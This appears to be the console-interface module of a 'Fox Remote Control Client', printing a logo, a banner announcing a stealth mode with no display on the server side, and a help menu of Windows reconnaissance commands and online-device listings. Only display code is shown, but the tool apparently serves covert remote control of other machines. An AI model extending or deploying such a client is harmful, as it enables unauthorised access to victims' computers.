from colorama import init, Fore, Back, Style
import platform

init(autoreset=True)

FOX_LOGO = f"""
{Fore.RED}{Back.BLACK} ███████╗ ██████╗ ██╗  ██╗
{Fore.RED}{Back.BLACK} ██╔════╝██╔═══██╗╚██╗██╔╝
{Fore.RED}{Back.BLACK} █████╗  ██║   ██║ ╚███╔╝ 
{Fore.RED}{Back.BLACK} ██╔══╝  ██║   ██║ ██╔██╗ 
{Fore.RED}{Back.BLACK} ██║     ╚██████╔╝██╔╝ ██╗
{Fore.RED}{Back.BLACK} ╚═╝      ╚═════╝ ╚═╝  ╚═╝
{Style.RESET_ALL}
"""

def clear_screen():
    """清屏函数"""
    if platform.system() == "Windows":
        import os
        os.system('cls')
    else:
        print("\033c", end="")

def display_banner():
    """显示隐蔽版横幅"""
    clear_screen()
    print(FOX_LOGO)
    print(f"{Fore.RED}[ Fox Remote Control Client ]{Style.RESET_ALL}")
    print(f"{Fore.RED}{Back.BLACK} 隐蔽模式激活 - 无服务器端显示 {Style.RESET_ALL}\n")

def get_help():
    """获取帮助信息"""
    return f"""
{Fore.RED}┌──────────────────────────────────┐
{Fore.RED}│  {Fore.BLACK}{Back.RED} 命 令 帮 助 {Style.RESET_ALL}{Fore.RED}            │
{Fore.RED}├──────────────────────────────────┤
{Fore.RED}│  {Fore.WHITE}系统信息:{Style.RESET_ALL}                       │
{Fore.RED}│    {Fore.CYAN}systeminfo{Fore.RED}       - 查看系统信息        │
{Fore.RED}│    {Fore.CYAN}ipconfig{Fore.RED}         - 查看网络配置        │
{Fore.RED}│  {Fore.WHITE}进程管理:{Style.RESET_ALL}                       │
{Fore.RED}│    {Fore.CYAN}tasklist{Fore.RED}         - 查看运行进程        │
{Fore.RED}│    {Fore.CYAN}kill PID{Fore.RED}         - 结束指定进程        │
{Fore.RED}│  {Fore.WHITE}文件操作:{Style.RESET_ALL}                       │
{Fore.RED}│    {Fore.CYAN}dir{Fore.RED}             - 列出当前目录         │
{Fore.RED}│    {Fore.CYAN}type 文件名{Fore.RED}      - 查看文件内容         │
{Fore.RED}│  {Fore.WHITE}网络工具:{Style.RESET_ALL}                       │
{Fore.RED}│    {Fore.CYAN}ping 地址{Fore.RED}        - 测试网络连接        │
{Fore.RED}│    {Fore.CYAN}netstat{Fore.RED}          - 查看网络连接       │
{Fore.RED}│  {Fore.WHITE}特殊命令:{Style.RESET_ALL}                       │
{Fore.RED}│    {Fore.CYAN}/help{Fore.RED}           - 显示本帮助          │
{Fore.RED}│    {Fore.CYAN}/online*{Fore.RED}         - 显示在线设备(bug)  │
{Fore.RED}│    {Fore.CYAN}/history*{Fore.RED}         - 显示历史设备(bug) │
{Fore.RED}│    {Fore.CYAN}/clear{Fore.RED}          - 清空屏幕           │
{Fore.RED}│    {Fore.CYAN}exit{Fore.RED}            - 退出程序           │
{Fore.RED}└──────────────────────────────────┘
{Style.RESET_ALL}"""